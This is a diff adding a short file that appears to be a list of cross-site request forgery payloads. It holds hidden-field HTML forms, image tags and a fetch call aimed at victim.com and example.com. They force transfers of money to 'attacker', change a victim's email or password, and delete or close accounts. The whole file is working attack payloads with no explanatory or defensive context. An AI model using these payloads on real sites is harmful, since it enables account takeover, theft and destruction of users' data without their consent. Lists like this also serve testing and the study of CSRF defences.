@@ -1,0 +1,31 @@
+<form action="http://victim.com" method="POST">
+<input type="hidden" name="amount" value="5000">
+<input type="submit">
+</form>
+<img src="http://victim.com/logout"/>
+<script>fetch('/delete?post=123', {method: 'DELETE'})</script>
+<form action="http://example.com/transfer" method="POST">
+<input type="hidden" name="account" value="attacker">
+<input type="hidden" name="amount" value="1000">
+<input type="submit">
+</form>
+<img src="http://example.com/delete-account"/>
+<form action="http://example.com/update-email" method="POST">
+<input type="hidden" name="new_email" value="attacker@example.com">
+<input type="submit">
+</form>
+<img src="http://example.com/change-password?new_pass=123456"/>
+<form action="http://example.com/add-friend" method="POST">
+<input type="hidden" name="friend_id" value="attacker">
+<input type="submit">
+</form>
+<form action="http://example.com/send-money" method="POST">
+<input type="hidden" name="recipient" value="attacker">
+<input type="hidden" name="amount" value="1000">
+<input type="submit">
+</form>
+<img src="http://example.com/close-account"/>
+<form action="http://example.com/update-profile" method="POST">
+<input type="hidden" name="name" value="attacker">
+<input type="submit">
+</form>
